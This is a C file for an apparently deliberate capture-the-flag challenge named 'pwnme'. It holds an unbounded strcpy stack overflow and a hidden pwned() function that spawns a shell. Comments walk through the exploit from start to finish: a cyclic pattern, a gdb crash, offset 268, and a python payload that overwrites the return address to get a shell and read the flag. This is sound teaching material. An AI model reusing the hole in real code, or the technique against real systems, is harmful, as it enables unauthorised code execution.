// gcc pwnme.c -o pwnme -fno-stack-protector -m32

#include < stdio.h >
#include < stdlib.h >
#include < string.h >

void pwned()
{
    system("sh");
}

int main(int argc, char*argv[])
{
    char buffer[256];

    if (argc < 2) {
        perror("Usage: ./pwnme twitt\n");
        return 1;
    }

    strcpy(buffer, argv[1]);
    printf("%s", buffer);

    return 0;
}

// rootλkali:➜ ~ # pattern_create 300
// Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

// pwn5@binary-challenges-pwnerrank-com:~$ gdb ./pwnme
// (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
// Starting program: /home/pwn5/pwnme Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
//  _____                           _____             _
// |  __ \                         |  __ \           | |
// | |__) |_      ___ __   ___ _ __| |__) |__ _ _ __ | | __
// |  ___/\ \ /\ / / '_ \ / _ \ '__|  _  // _` | '_ \| |/ /
// | |     \ V  V /| | | |  __/ |  | | \ \ (_| | | | |   <
// |_|      \_/\_/ |_| |_|\___|_|  |_|  \_\__,_|_| |_|_|\_\

// Program received signal SIGSEGV, Segmentation fault.
// 0x6a413969 in ?? ()
// (gdb) disassemble pwned
// Dump of assembler code for function pwned:
//    0x080484ec <+0>:     push   %ebp

// rootλkali:➜ ~ # pattern_offset 0x6a413969
// [*] Exact match at offset 268

// pwn5@binary-challenges-pwnerrank-com:~$ ./pwnme `python -c 'print "A"*268 + "\xec\x84\x04\x08"\'`
//  _____                           _____             _
// |  __ \                         |  __ \           | |
// | |__) |_      ___ __   ___ _ __| |__) |__ _ _ __ | | __
// |  ___/\ \ /\ / / '_ \ / _ \ '__|  _  // _` | '_ \| |/ /
// | |     \ V  V /| | | |  __/ |  | | \ \ (_| | | | |   <
// |_|      \_/\_/ |_| |_|\___|_|  |_|  \_\__,_|_| |_|_|\_\
// $ cat .flag

